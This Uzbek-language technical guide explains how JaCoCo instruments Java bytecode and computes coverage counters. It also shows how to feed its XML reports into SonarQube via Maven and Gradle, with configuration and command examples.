### 9.1 JaCoCo qanday ishlaydi: bytecode ga instrumentatsiya qo'shish

JaCoCo manba kodni o'qimaydi. U kompilyatsiya natijasi bo'lgan `.class` fayllarini ASM kutubxonasi orqali o'qiydi va ularga qo'shimcha instruksiyalar kiritadi. Bu qo'shimcha instruksiyalar probe deb ataladi. Har bir probe mantiqan bitta amal qiladi: `boolean[]` massivining ma'lum indeksiga `true` yozadi.

Probe har bir qator uchun emas, balki control flow ning har bir tugash nuqtasi uchun qo'yiladi. JaCoCo metodni basic block larga ajratadi. Basic block bu shartsiz ketma-ket bajariladigan instruksiyalar guruhi. Probe shart operatori, qaytish, exception tashlash va metod chiqishidan oldin joylashadi. Shu sababli probe soni qator sonidan ancha kam bo'ladi.

Qator qamrovi bilvosita hisoblanadi. JaCoCo `.class` fayldagi `LineNumberTable` debug jadvalidan foydalanadi. Bu jadval har bir bytecode instruksiyasini manba kod qatoriga bog'laydi. Agar kod `-g:none` bilan yoki debug ma'lumotini o'chirib kompilyatsiya qilingan bo'lsa, qator qamrovi butunlay yo'qoladi va faqat instruction va branch qoladi.

```xml
<!-- Debug ma'lumoti saqlanishi shart, aks holda line coverage 0 bo'ladi -->
<plugin>
  <groupId>org.apache.maven.plugins</groupId>
  <artifactId>maven-compiler-plugin</artifactId>
  <configuration>
    <!-- Maven da standart qiymat true, lekin ba'zi profil uni o'chiradi -->
    <debug>true</debug>
    <!-- vars, lines va source uchligi JaCoCo ga kerak -->
    <debuglevel>lines,vars,source</debuglevel>
    <release>21</release>
  </configuration>
</plugin>
```

### 9.2 Java agent va offline instrumentatsiya farqi

Standart rejim bu Java agent. JVM ishga tushganda `-javaagent` orqali JaCoCo o'rnatiladi va u `ClassFileTransformer` sifatida ro'yxatdan o'tadi. Classloader har bir klassni yuklaganda JaCoCo baytlarni ushlab oladi, probe qo'shadi va o'zgartirilgan versiyani JVM ga beradi. Diskdagi `.class` fayl o'zgarmaydi.

Offline instrumentatsiya boshqacha ishlaydi. Bu rejimda `jacoco:instrument` goal `.class` fayllarni build vaqtida o'zgartiradi va diskka qaytib yozadi. Test shu o'zgartirilgan klasslar bilan ishlaydi, keyin `jacoco:restore-instrumented-classes` asl holatni tiklaydi. Bu rejim faqat agent ishlamaydigan holatlarda kerak bo'ladi: o'z classloader ini yozadigan konteynerlar, Android, yoki bytecode ni qattiq nazorat qiladigan muhitlar.

Spring Boot loyihasida deyarli har doim agent rejimi to'g'ri tanlov. Offline rejim ikki xavf olib keladi. Birinchisi, instrumentatsiya qilingan klass `jacoco-agent` ni runtime dependency sifatida talab qiladi. Ikkinchisi, tiklash bosqichi o'tkazib yuborilsa, instrumentatsiya qilingan klasslar artifact ga tushib qolishi mumkin.

```bash
# Agent rejimi: argLine ni JaCoCo o'zi to'ldiradi
mvn clean verify
# JVM ga aslida shunday argument boradi
# -javaagent:~/.m2/.../org.jacoco.agent-0.8.12-runtime.jar=destfile=target/jacoco.exec

# Agentni qo'lda ulash, masalan ishlab turgan Spring Boot ilovaga
java -javaagent:/opt/jacoco/jacocoagent.jar=destfile=/data/jacoco-e2e.exec,append=true,output=tcpserver,address=*,port=6300 \
     -jar payment-service.jar

# Ishlab turgan JVM dan ma'lumotni uzmasdan olish
java -jar jacococli.jar dump --address localhost --port 6300 --destfile target/jacoco-e2e.exec
```

### 9.3 `jacoco.exec` fayli: nima yoziladi va qanday hisobotga aylanadi

`jacoco.exec` binar fayl va uning ichidagi ma'lumot juda kam. U ikki turdagi blokdan iborat: session ma'lumoti va execution ma'lumoti. Session blokida JVM identifikatori va vaqt oralig'i bor. Execution bloki har bir klass uchun uch narsani saqlaydi: klass nomi, klass identifikatori va `boolean[]` probe massivi.

Klass identifikatori bu klass baytlarining CRC64 qiymati. Bu eng ko'p uchraydigan muammoning manbai. Agar test bir versiya klass bilan ishlagan, hisobot esa qayta kompilyatsiya qilingan boshqa versiya bilan yaratilsa, CRC64 mos kelmaydi va JaCoCo o'sha klassni butunlay tashlab ketadi. Natijada hisobotda klass 0% bilan turadi yoki umuman ko'rinmaydi.

E'tibor bering: `.exec` da qator raqami ham, branch nomi ham, test nomi ham yo'q. Faqat probe lar massivi. Hisobot bosqichida JaCoCo `.class` fayllarni yana bir marta o'qiydi, control flow ni qayta quradi, probe natijalarini unga joylaydi va shundan keyin qator va branch qamrovini chiqaradi. Shu sababli hisobot yaratish uchun `.exec` dan tashqari `target/classes` va manba kod ham kerak.

```bash
# .exec ichidagini o'qish: qaysi klasslar bor va probe lar soni
java -jar jacococli.jar execinfo target/jacoco.exec | head -20

# Hisobotni .exec, .class va manba koddan qo'lda yaratish
java -jar jacococli.jar report target/jacoco.exec \
  --classfiles target/classes \
  --sourcefiles src/main/java \
  --xml target/site/jacoco/jacoco.xml \
  --html target/site/jacoco

# Mos kelmaslik xatosi aynan shunday ko'rinadi:
# Execution data for class com/shop/payment/PaymentService does not match.
```

### 9.4 Instruction, line, branch, complexity va method qamrovi farqi

JaCoCo bitta o'tishda beshta hisoblagich chiqaradi va ular bir narsani o'lchamaydi. Instruction eng mayda birlik: har bir bytecode instruksiyasi. Bu ko'rsatkich kompilyator chiqargan hamma narsani sanaydi, shuning uchun u debug ma'lumotiga bog'liq emas va eng barqaror hisoblanadi.

Line qamrovi manba qatorlari ustida ishlaydi. Qator qisman qoplangan bo'lishi mumkin: agar qatorga tegishli instruksiyalarning bir qismi bajarilgan bo'lsa, HTML hisobotda sariq rombcha chiqadi. Branch qamrovi faqat `if` va `switch` dan tug'ilgan tarmoqlarni sanaydi. Bu yerda muhim nozik jihat bor: `try/catch` dagi exception yo'li branch emas, chunki bytecode da u `IFEQ` kabi shart instruksiyasi bilan emas, exception table orqali ifodalanadi.

Complexity bu metod bo'yicha cyclomatic complexity. JaCoCo uni shart tarmoqlari sonidan hisoblaydi va qoplangan complexity ni "nechta mustaqil yo'l bosib o'tilgan" ma'nosida beradi. Method va class hisoblagichlari esa shunchaki "hech bo'lmasa bir instruksiya bajarildi mi" degan savolga javob beradi, shuning uchun ular eng yumshoq ko'rsatkich.

| Hisoblagich | Nimani sanaydi | Debug ma'lumotiga bog'liq | Qachon ishonchli |
|---|---|---|---|
| INSTRUCTION | bytecode instruksiyasi | yo'q | har doim, eng barqaror |
| LINE | manba kod qatori | ha, `lines` kerak | manba bilan mos build da |
| BRANCH | `if` va `switch` tarmog'i | yo'q | shart mantig'ini tekshirishda |
| COMPLEXITY | metod bo'yicha mustaqil yo'l | yo'q | murakkab mantiqni baholashda |
| METHOD | kamida bir marta kirilgan metod | yo'q | o'lik kodni topishda |
| CLASS | kamida bir metodi ishlagan klass | yo'q | modul darajasida umumiy nazar |

### 9.5 SonarQube qaysi ko'rsatkichni oladi va `coverage` qanday hisoblanadi

Zamonaviy SonarQube `.exec` faylni o'qimaydi. Binar format qo'llovi sonar-java 6 liniyasida olib tashlangan, shuning uchun 9.9 LTA va 2025 LTA liniyasida faqat XML hisobot qabul qilinadi. Yo'l `sonar.coverage.jacoco.xmlReportPaths` parametri orqali beriladi va u vergul bilan ajratilgan bir nechta faylni qabul qiladi.

Sonar JaCoCo XML dan faqat ikki narsani oladi: qator holati (`<line nr="..." mi="..." ci="..." mb="..." cb="..."/>`) va shu qatordagi shart soni. Instruction, method va class hisoblagichlari Sonar ga umuman o'tmaydi. Shu sababli JaCoCo HTML dagi instruction foizi bilan Sonar dagi coverage foizi hech qachon aynan bir xil bo'lmaydi va bu xato emas.

Sonar `coverage` ni qator va shart qamrovini birlashtirib hisoblaydi. Formula quyidagicha: `Coverage = (CT + LC) / (2 * B + EL)`. Bu yerda `EL` bajariladigan qatorlar soni, `LC` qoplangan qatorlar soni, `B` shartlar soni va `CT` qoplangan shartlar soni. Natijada bitta qoplanmagan shart umumiy foizni qoplanmagan qatordan ko'proq tushiradi, chunki shartlar hisobda ikki marta og'irlik oladi.

```properties
# Sonar faqat XML o'qiydi, .exec yo'lini berish foydasiz
sonar.coverage.jacoco.xmlReportPaths=target/site/jacoco-aggregate/jacoco.xml
# Generatsiya qilingan kodni qamrovdan chiqarish
sonar.coverage.exclusions=**/config/**,**/dto/**,**/*Application.java
# Testlar o'zi coverage ga kirmasligi uchun manba yo'llarini ajratish
sonar.sources=src/main/java
sonar.tests=src/test/java
sonar.java.binaries=target/classes
```

### 9.6 Lambda, switch ifodasi va string konkatenatsiyasi bytecode da qanday ko'rinadi

Lambda bytecode da anonim klass emas. Javac lambda tanasini `lambda$processOrder$0` kabi nomli sintetik private metodga chiqaradi va chaqirish joyida `invokedynamic` qo'yadi. JaCoCo bu sintetik metodni filtrlamaydi, chunki uning tanasi haqiqiy foydalanuvchi kodi. Natija shunday: `invokedynamic` turgan qator ishlasa yashil bo'ladi, lekin lambda tanasi hech qachon chaqirilmasa uning qatorlari qizil qoladi.

Bu `Optional`, `Stream` va `orElseThrow` bilan ishlaganda tez-tez chiqadi. `orElseThrow(() -> new NotFoundException(id))` qatori har bir test da bajariladi, ammo exception tanasi faqat topilmagan holat test qilinganda qoplanadi. Shuning uchun har bir lambda uchun kamida bitta uni bajaradigan test kerak.

Switch ifodasi ikki xil bytecode beradi. `int` yoki `enum` ustidagi zich qiymatlar `tableswitch`, tarqoq qiymatlar `lookupswitch` ga tushadi. `String` ustidagi switch esa ikki bosqichli bo'ladi: avval `hashCode()` bo'yicha switch, keyin `equals()` bilan tasdiqlash. JaCoCo 0.8.x da bu ikkinchi bosqich uchun maxsus filtr bor, shuning uchun string switch sun'iy branch yaratmaydi. `enum` ustidagi switch uchun javac versiyasiga qarab sintetik `$SwitchMap$` massivi yaratilishi mumkin va eski JaCoCo versiyalarida bu qoplanmagan branch sifatida chiqqan.

String konkatenatsiyasi Java 9 dan beri `StringBuilder` zanjiri emas. Javac `StringConcatFactory` ga `invokedynamic makeConcatWithConstants` chiqaradi va bu bitta instruksiya bo'ladi. Amaliy natija shu: log xabari yoki exception matnidagi uzun konkatenatsiya instruction sonini kam oshiradi, lekin ichida ternary bo'lsa branch qo'shadi.

```java
// Sonar shikoyat qiladi: lambda tanasi qoplanmagan, branch 1/2
public Order confirm(Long orderId) {
    return repo.findById(orderId)
        // bu lambda alohida sintetik metod, o'z qamroviga ega
        .orElseThrow(() -> new OrderNotFoundException("topilmadi: " + orderId));
}

// Switch ifodasi: har bir case alohida branch, default ham sanaladi
public BigDecimal fee(PaymentMethod method) {
    return switch (method) {
        case CARD -> BigDecimal.valueOf(0.025);
        case TRANSFER -> BigDecimal.ZERO;
        // exhaustive switch da default yozilmasa, javac sintetik
        // MatchException tarmog'ini qo'shadi va u qoplanmay qoladi
        case WALLET -> BigDecimal.valueOf(0.01);
    };
}
```

### 9.7 Bytecode dagi yashirin shartlar: nega qator yashil, lekin branch sariq

Eng ko'p savol tug'diradigan holat shu: qator yashil, lekin yonida "1 of 2 branches missed" yozuvi turadi. Sababi oddiy. Qator qamrovi "bu qatorning instruksiyalari bajarildi mi" deydi, branch qamrovi esa "bu qatordagi har bir shart ikki yo'nalishda ham sinaldi mi" deb so'raydi.

`&&` va `||` operatorlari bitta qatorda bir nechta shart yaratadi. `if (order.isPaid() && order.getItems().size() > 0)` qatori bytecode da ikki `IFEQ` beradi, ya'ni to'rt tarmoq. Short-circuit sababli birinchi shart `false` bo'lsa ikkinchisi hech qachon bajarilmaydi. To'rt tarmoqni to'liq qoplash uchun kamida uch xil kirish kerak.

Bundan tashqari kompilyator ko'rinmaydigan shartlar qo'shadi. `assert` operatori `$assertionsDisabled` maydoni ustida shart yaratadi. `try-with-resources` `close()` chaqirig'ini takrorlaydi va `null` tekshiruvi qo'yadi. Avtomatik unboxing `null` tekshiruvini keltiradi. JaCoCo 0.8.x bu naqshlarning kattaroq qismini filtrlaydi: `assert`, `try-with-resources` ning takroriy `finally` bloki, `record` ning generatsiya qilingan `equals`, `hashCode`, `toString` metodlari, `enum` ning `values()` va `valueOf()` metodlari, hamda `lombok.Generated` bilan belgilangan kod. Filtr ishlashi uchun JaCoCo versiyasi yangi bo'lishi kerak, shuning uchun 0.8.7 dan eski versiyada ko'p soxta qoplanmagan branch ko'rinadi.

| Tuzoq | Nega shunday bo'ladi | Yechim |
|---|---|---|
| Qator yashil, branch sariq | bir qatorda `&&` orqali ikki shart bor | shartni ajratib yoz yoki uchinchi test holatini qo'sh |
| Lombok generatsiya qilgan kod qoplanmagan | eski JaCoCo filtri `@Generated` ni bilmaydi | JaCoCo 0.8.8 va yuqorisiga o't, `lombok.config` da `addLombokGeneratedAnnotation = true` |
| `record` metodlari qizil | kanonik `equals` sinovdan o'tmagan | JaCoCo yangi versiyasi ularni filtrlaydi, versiyani tekshir |
| Klass 0% bilan turadi | `.exec` dagi CRC64 hisobotdagi `.class` ga mos emas | hisobotni test ishlagan build artefakti bilan yarat, orada `clean` qilma |
| `enum` switch da qo'shimcha branch | sintetik `$SwitchMap` yoki `MatchException` tarmog'i | exhaustive switch da `default` yozma, JaCoCo ni yangila |
| Line coverage umuman 0 | `-g:none` yoki `<debug>false</debug>` ishlatilgan | debug ma'lumotini `lines,vars,source` bilan yoqib qo'y |
| Integratsion test qamrovi ko'rinmaydi | forked JVM da agent yo'q | `prepare-agent-integration` qo'sh, `argLine` ni qo'lda bosib ketma |
| Aggregate hisobot bo'sh | report modul barcha modullarga dependency emas | alohida report modul yarat va har bir modulni dependency qil |

### 9.8 Unit test va integratsion test qamrovini birlashtirish

JaCoCo Maven plugin ikki xil agent goal beradi. `prepare-agent` Surefire uchun `argLine` ni to'ldiradi, `prepare-agent-integration` esa Failsafe uchun `failsafeArgLine` ni. Ularni ikki alohida `destfile` ga yozish va keyin birlashtirish eng toza yondashuv.

Birlashtirishning ikki yo'li bor. Birinchisi `jacoco:merge` goal: bir nechta `.exec` ni bitta faylga qo'shadi, keyin ulardan bitta hisobot chiqariladi. Ikkinchisi Sonar tomonida: `sonar.coverage.jacoco.xmlReportPaths` ga ikki XML yo'lini vergul bilan berish. Sonar ularni qator darajasida birlashtiradi, ya'ni biror qator birinchi hisobotda qizil, ikkinchisida yashil bo'lsa, natijada yashil bo'ladi.

Eng ko'p uchraydigan xato bu `argLine` ni plugin konfiguratsiyasida qo'lda qattiq yozib qo'yish. Bunda JaCoCo qo'ygan qiymat yo'q bo'ladi va `.exec` fayl bo'sh chiqadi. Agar Surefire ga qo'shimcha JVM argument kerak bo'lsa, `@{argLine}` kech kengaytirish sintaksisini ishlatish kerak.

```xml
<plugin>
  <groupId>org.jacoco</groupId>
  <artifactId>jacoco-maven-plugin</artifactId>
  <version>0.8.12</version>
  <executions>
    <execution><id>ut-agent</id><goals><goal>prepare-agent</goal></goals>
      <configuration><destFile>${project.build.directory}/jacoco-ut.exec</destFile></configuration>
    </execution>
    <execution><id>it-agent</id><goals><goal>prepare-agent-integration</goal></goals>
      <configuration><destFile>${project.build.directory}/jacoco-it.exec</destFile>
        <!-- Failsafe shu property ni argLine sifatida ishlatadi -->
        <propertyName>failsafeArgLine</propertyName></configuration>
    </execution>
    <execution><id>merge-all</id><phase>verify</phase><goals><goal>merge</goal></goals>
      <configuration><fileSets><fileSet>
        <directory>${project.build.directory}</directory>
        <includes><include>jacoco-*.exec</include></includes>
      </fileSet></fileSets>
        <destFile>${project.build.directory}/jacoco-merged.exec</destFile></configuration>
    </execution>
    <execution><id>xml-report</id><phase>verify</phase><goals><goal>report</goal></goals>
      <configuration><dataFile>${project.build.directory}/jacoco-merged.exec</dataFile></configuration>
    </execution>
  </executions>
</plugin>
```

### 9.9 Ko'p modulli loyihada umumiy hisobot yig'ish

Ko'p modulli Maven loyihasida har bir modul o'z `.exec` va o'z hisobotini chiqaradi. Muammo shunda: `order-service` modulidagi test `shared-domain` modulidagi klassni ishlatsa, bu qamrov `shared-domain` hisobotida ko'rinmaydi, chunki hisobot faqat o'z modulining `.class` fayllari ustida yaratiladi. Natijada umumiy foiz haqiqatdan past chiqadi.

Yechim bu `report-aggregate` goal. Alohida, odatda `coverage` deb nomlangan modul yaratiladi. U hech qanday kod saqlamaydi, lekin barcha boshqa modullarni dependency qilib oladi. `report-aggregate` har bir dependency modulning `.exec` va `.class` fayllarini topadi va ulardan bitta birlashgan XML chiqaradi. Bu modul reactor da oxirgi bo'lishi kerak.

Keyin Sonar ga faqat shu bitta XML yo'li beriladi. Alternativa sifatida har bir modulning XML yo'lini vergul bilan sanash ham ishlaydi, lekin modul qo'shilganda yo'lni yangilashni esdan chiqarish xavfi bor. Gradle da bu vazifa `JacocoReport` task ini barcha subproject ning `executionData` va `sourceSets` i bilan sozlash orqali hal qiladi.

```xml
<!-- coverage/pom.xml: kodsiz, faqat yig'uvchi modul -->
<project>
  <artifactId>coverage</artifactId>
  <dependencies>
    <!-- Har bir modul shu yerda sanalishi SHART -->
    <dependency><groupId>com.shop</groupId><artifactId>shared-domain</artifactId>
      <version>${project.version}</version></dependency>
    <dependency><groupId>com.shop</groupId><artifactId>order-service</artifactId>
      <version>${project.version}</version></dependency>
    <dependency><groupId>com.shop</groupId><artifactId>payment-service</artifactId>
      <version>${project.version}</version></dependency>
  </dependencies>
  <build><plugins><plugin>
    <groupId>org.jacoco</groupId><artifactId>jacoco-maven-plugin</artifactId>
    <executions><execution>
      <id>aggregate</id><phase>verify</phase>
      <goals><goal>report-aggregate</goal></goals>
      <configuration>
        <!-- test scope dagi dependency ham hisobga olinadi -->
        <includeCurrentProject>false</includeCurrentProject>
      </configuration>
    </execution></executions>
  </plugin></plugins></build>
</project>
```

### 9.10 Qamrov o'lchovining chegarasi: bajarilgan kod tekshirilgan degani emas

Probe faqat bitta narsani aytadi: bu instruksiya bajarildi. U natija to'g'ri ekanini tekshirmaydi. Shuning uchun assertion yozmagan test ham coverage ni oshiradi. Quyidagi test `calculateTotal` ning har bir qatorini yashil qiladi, lekin hisob xato bo'lsa ham o'tadi.

```java
// Sonar coverage ni qondiradi, lekin hech narsani tekshirmaydi
@Test
void shouldCalculateTotal() {
    cart.add(new Item("kitob", BigDecimal.TEN, 3));
    cart.add(new Item("qalam", BigDecimal.ONE, 2));
    service.calculateTotal(cart); // natija tashlab yuborildi
}

// Haqiqiy tekshiruv: chegaraviy holat va natija qiymati
@Test
void shouldApplyDiscountOnlyAboveThreshold() {
    cart.add(new Item("kitob", new BigDecimal("99.99"), 1));
    assertThat(service.calculateTotal(cart)).isEqualByComparingTo("99.99");
    cart.add(new Item("qalam", new BigDecimal("0.01"), 1));
    // 100.00 chegarasida 10% chegirma ishlashi kerak
    assertThat(service.calculateTotal(cart)).isEqualByComparingTo("90.00");
}
```

Qamrovning ikkinchi chegarasi ma'lumot bo'yicha. Branch qamrovi "ikki yo'nalish sinaldi" deydi, lekin `BigDecimal` yaxlitlash rejimi xato bo'lsa buni ko'rsatmaydi. `null`, bo'sh ro'yxat, manfiy miqdor va integer overflow kabi holatlar qamrov 100% bo'lganda ham sinalmagan bo'lishi mumkin. Shuning uchun qamrov yagona o'lchov bo'lmasligi kerak. Mutation testing, masalan PIT, kodni ataylab buzib testning sezgirligini o'lchaydi va qamrov ko'rsatmagan bo'shliqni topadi. Test sifatini oshirish usullari testlash qo'llanmasidagi test ma'lumotlari va metrikalar mavzularida batafsil berilgan.

| Vaziyat | Oddiy yondashuv | Arxitektor yondashuvi |
|---|---|---|
| Coverda maqsad | "80% ga yetsak bo'ldi" | yangi kodga qattiq shart, eski kodga alohida reja |
| Hisobot manbasi | Sonar `.exec` ni o'qiydi deb o'ylash | faqat XML berish, yo'lni CI da tekshirish |
| Lambda qamrovi | foizni oshirish uchun lambda ni olib tashlash | lambda tanasini bajaradigan test holati yozish |
| Branch sariq qolgani | `// NOSONAR` yoki exclusion qo'shish | bir qatordagi ikki shartni ajratib, uchinchi testni qo'shish |
| Generatsiya qilingan kod | qo'lda `coverage.exclusions` ro'yxatini uzaytirish | JaCoCo filtrlarini yangilash, `lombok.config` ni to'g'rilash |
| Integratsion test | qamrovni hisobga olmaslik | ikki `.exec` ni merge qilib yoki ikki XML berib birlashtirish |
| Ko'p modul | har bir modul foizini alohida ko'rish | `report-aggregate` modul, bitta umumiy raqam |
| Sifat kafolati | qamrov foiziga ishonish | qamrov plus mutation testing plus assertion sifati nazorati |
| Chegaraviy holat | happy path test yetarli deb hisoblash | chegara, `null` va xato yo'lini alohida test bilan qoplash |
| Build xatosi | qamrov pastligida build ni o'tkazib yuborish | `jacoco:check` bilan lokal darajada ham to'xtatish |

### 9.11 Amalda qo'llash

- [ ] `mvn help:effective-pom | grep -A3 '<debug'` bilan debug ma'lumoti yoqilganini tasdiqlang, aks holda line coverage 0 bo'ladi.
- [ ] JaCoCo versiyasini 0.8.12 yoki undan yangisiga ko'taring va `lombok.config` ga `lombok.addLombokGeneratedAnnotation = true` qo'shing.
- [ ] `prepare-agent` va `prepare-agent-integration` ni ikki alohida `destFile` bilan sozlang, keyin `merge` va `report` goal larini `verify` fazasiga ulang.
- [ ] `sonar.coverage.jacoco.xmlReportPaths` ni XML hisobotga yo'naltiring va `.exec` yo'li qolmaganini tekshiring.
- [ ] Ko'p modulli loyihada kodsiz `coverage` modulini `report-aggregate` bilan yaratib, reactor da oxirgi qilib qo'ying.
- [ ] HTML hisobotdagi eng past branch qamrovi bo'lgan beshta metodni oching va har bir sariq rombcha uchun qaysi shart sinalmaganini yozib chiqing.
- [ ] Har bir `orElseThrow` va `Optional` lambda si uchun uni bajaradigan alohida test holati borligini tasdiqlang.
- [ ] PIT mutation testing ni eng muhim ikki paketga ulab, mutation score bilan line coverage o'rtasidagi farqni o'lchang.

## 10. JaCoCo va SonarQube ulanishi: Maven va Gradle sozlash (Wiring JaCoCo to SonarQube)

Sonar coverage ni o'zi o'lchamaydi. U faqat JaCoCo tayyorlagan XML hisobotni o'qiydi va undagi raqamlarni quality gate shartlari bilan solishtiradi. Shuning uchun "coverage 0%" muammosining deyarli hammasi Sonar da emas, balki build sozlamasida: agent ulanmagan, XML yaratilmagan yoki yo'l noto'g'ri ko'rsatilgan. Bu bobda Maven va Gradle uchun to'liq ishlaydigan ulanish zanjiri va uni tekshirish tartibi beriladi.

### 10.1 Maven da JaCoCo plugin: `prepare-agent` va `report` bosqichlari

Zanjir ikki goal dan iborat. `prepare-agent` test JVM ga `-javaagent` argumentini qo'shadi, bu argument `argLine` nomli Maven property ga yoziladi. Testlar ishlaganda agent bayt kodni uchishda instrumentatsiya qiladi va natijani binar `jacoco.exec` fayliga yozadi. `report` goal shu binar fayl va `target/classes` dagi klasslarni solishtirib HTML, CSV va XML hisobot chiqaradi.

Muhim nuqta: `prepare-agent` odatda `initialize` fazasiga, `report` esa `verify` fazasiga bog'lanadi. Agar siz `mvn test` bilan to'xtasangiz, XML hali yaratilmagan bo'ladi. Shuning uchun `report` ni ataylab `test` fazasiga ko'chirish yoki build ni `verify` gacha olib borish kerak.

```xml
<plugin>
  <groupId>org.jacoco</groupId>
  <artifactId>jacoco-maven-plugin</artifactId>
  <version>0.8.12</version>
  <executions>
    <execution>
      <id>jacoco-agentni-ulash</id>
      <goals>
        <goal>prepare-agent</goal>
      </goals>
    </execution>
    <execution>
      <!-- report ni test dan keyin darhol chiqaramiz -->
      <id>jacoco-xml-hisobot</id>
      <phase>test</phase>
      <goals>
        <goal>report</goal>
      </goals>
      <configuration>
        <!-- XML Sonar uchun, HTML odam uchun -->
        <formats>
          <format>XML</format>
          <format>HTML</format>
        </formats>
      </configuration>
    </execution>
  </executions>
</plugin>
```

JaCoCo versiyasini Java versiyasiga qarab tanlang. Yangi JDK chiqqanda JaCoCo ning eski versiyasi yangi class file major version ni tanimaydi va `Unsupported class file major version` xatosini beradi. Java 21 va undan yuqorisida 0.8.11 dan boshlab yuqori versiyalardan foydalanish xavfsizroq, aniq moslik jadvalini JaCoCo release yozuvlaridan tekshirish kerak.

### 10.2 Hisobot yo'lini Sonar ga ko'rsatish: `sonar.coverage.jacoco.xmlReportPaths`

Sonar da coverage ni import qiladigan sensor nomi JaCoCo XML Report Importer. U faqat bitta parametrga qaraydi: `sonar.coverage.jacoco.xmlReportPaths`. Bu parametr vergul bilan ajratilgan ro'yxatni qabul qiladi, nisbiy yo'llar modul bazasiga nisbatan hisoblanadi.

`sonar-maven-plugin` ishlatilganda ko'p parametr pom dan avtomatik olinadi. Standalone scanner ishlatilganda esa hammasini qo'lda yozish kerak.

```properties
# Bitta modulli loyiha uchun root dagi sonar-project.properties
sonar.projectKey=shop-payment
sonar.projectName=Shop Payment Service
sonar.sources=src/main/java
sonar.tests=src/test/java
sonar.java.binaries=target/classes
sonar.java.test.binaries=target/test-classes
sonar.java.libraries=target/dependency/*.jar

# Coverage ning YAGONA manbasi
sonar.coverage.jacoco.xmlReportPaths=target/site/jacoco/jacoco.xml

# Test natijalari alohida parametr, coverage bilan aralashtirmaslik kerak
sonar.junit.reportPaths=target/surefire-reports,target/failsafe-reports

# Coverage talab qilinmaydigan joylar
sonar.coverage.exclusions=**/config/**,**/dto/**,**/*Application.java
```

`sonar.coverage.exclusions` va `sonar.exclusions` ni aralashtirib yubormang. Birinchisi faylni tahlilda qoldiradi, lekin coverage hisobidan chiqaradi. Ikkinchisi faylni butunlay tahlildan olib tashlaydi, ya'ni code smell va bug ham topilmaydi. Generated kod uchun ikkinchisi, konfiguratsiya klasslari uchun birinchisi to'g'ri keladi.

### 10.3 Nega XML hisobot kerak va binar `exec` fayl yetarli emas

Binar `jacoco.exec` fayli ichida faqat probe massivlari bor. Unda klass nomi bor, lekin qator raqamlari va shart tarmoqlari yo'q. Bu ma'lumotni olish uchun `exec` ni `target/classes` dagi haqiqiy bayt kod bilan birga o'qish shart. Shu birlashtirish ishini `jacoco:report` goal bajaradi.

Eski Sonar versiyalarida `sonar.jacoco.reportPaths` parametri bor edi va u binar faylni o'qiy olardi. Bu yondashuv SonarQube 8.x liniyasida olib tashlandi, sababi scanner ning class path ga bog'liq bo'lib qolishi va natijaning beqarorligi. Bugungi 9.9 LTA va 2025 LTA liniyasida yagona qo'llanadigan yo'l XML hisobot.

```bash
# Agent ishlagan bo'lsa binar fayl paydo bo'ladi
ls -l target/jacoco.exec

# Sonar bu faylni o'qimaydi, XML ni alohida chiqaramiz
mvn -q jacoco:report
ls -l target/site/jacoco/jacoco.xml

# XML ichida nechta klass borligini sanaymiz, 0 bo'lsa muammo bor
grep -c '<class name=' target/site/jacoco/jacoco.xml

# Umumiy LINE counter ni ko'ramiz: missed va covered qiymatlari
grep -o 'type="LINE" missed="[0-9]*" covered="[0-9]*"' \
  target/site/jacoco/jacoco.xml | tail -1
```

Agar `covered="0"` chiqsa, muammo Sonar da emas. Demak agent testlar paytida ulanmagan yoki testlar umuman ishlamagan. Sonar ga borishdan oldin shu joyda to'xtab sababini topish kerak.

### 10.4 Gradle da JaCoCo: `jacocoTestReport` va XML chiqishini yoqish

Gradle da `jacoco` plugin `test` task ga agent ni o'zi ulaydi. Lekin `jacocoTestReport` task XML ni odatiy holda chiqarmaydi, faqat HTML beradi. Shuning uchun XML ni ataylab yoqish kerak. Yana bir tuzoq: `jacocoTestReport` `test` dan keyin avtomatik ishlamaydi, uni `finalizedBy` bilan bog'lash kerak.

```groovy
plugins {
    id 'java'
    id 'jacoco'
    id 'org.sonarqube' version '5.1.0.4882'
}

jacoco { toolVersion = '0.8.12' }

test {
    useJUnitPlatform()
    // Test tugagach hisobot avtomatik chiqsin
    finalizedBy jacocoTestReport
}

jacocoTestReport {
    dependsOn test
    reports {
        // Gradle 7 dan boshlab required, undan oldin enabled edi
        xml.required = true
        html.required = true
        csv.required = false
    }
}
```

Sonar property larini alohida blokda beramiz. Yo'l Maven dagidan butunlay boshqacha, shuning uchun uni ko'chirishdan oldin tekshirish kerak.

```groovy
sonar {
    properties {
        property 'sonar.projectKey', 'shop-payment'
        // Gradle dagi odatiy yo'l: build/reports/jacoco/test/
        property 'sonar.coverage.jacoco.xmlReportPaths',
                "${layout.buildDirectory.get()}/reports/jacoco/test/jacocoTestReport.xml"
    }
}
```

Gradle dagi odatiy XML yo'li `build/reports/jacoco/test/jacocoTestReport.xml`. Bu Maven dagi yo'ldan butunlay boshqacha, shuning uchun hujjatdan ko'chirgan sozlamani tekshirmasdan ishlatish eng ko'p uchraydigan xato. Yangi `org.sonarqube` plugin versiyalari `jacocoTestReport` chiqishini o'zi topa oladi, lekin property ni aniq yozish hamma versiyada ishlaydi.

### 10.5 Ko'p modulli Maven loyihasida yig'ma hisobot tayyorlash

Ko'p modulli loyihada har bir modul o'z `jacoco.exec` faylini yozadi. Muammo shunda: `order-service` dagi test `shared-domain` modulidagi klassni ishlatsa, bu qamrov `shared-domain` ning o'z hisobotida ko'rinmaydi. Natijada umumiy foiz haqiqatdan past chiqadi va quality gate behuda yiqiladi.

Yechim `report-aggregate` goal. Buning uchun alohida modul yaratiladi va unga barcha hisoblanadigan modullar dependency sifatida qo'shiladi. Aggregate goal faqat shu modul dependency larini yig'adi, shuning uchun dependency ro'yxati to'liq bo'lishi shart.

```xml
<!-- coverage-report/pom.xml: faqat hisobot yig'ish uchun modul -->
<dependencies>
  <dependency>
    <groupId>com.shop</groupId>
    <artifactId>shared-domain</artifactId>
    <version>${project.version}</version>
  </dependency>
  <dependency>
    <groupId>com.shop</groupId>
    <artifactId>order-service</artifactId>
    <version>${project.version}</version>
  </dependency>
</dependencies>
<build>
  <plugins>
    <plugin>
      <groupId>org.jacoco</groupId>
      <artifactId>jacoco-maven-plugin</artifactId>
      <executions>
        <execution>
          <id>yigma-hisobot</id>
          <phase>verify</phase>
          <goals><goal>report-aggregate</goal></goals>
        </execution>
      </executions>
    </plugin>
  </plugins>
</build>
```

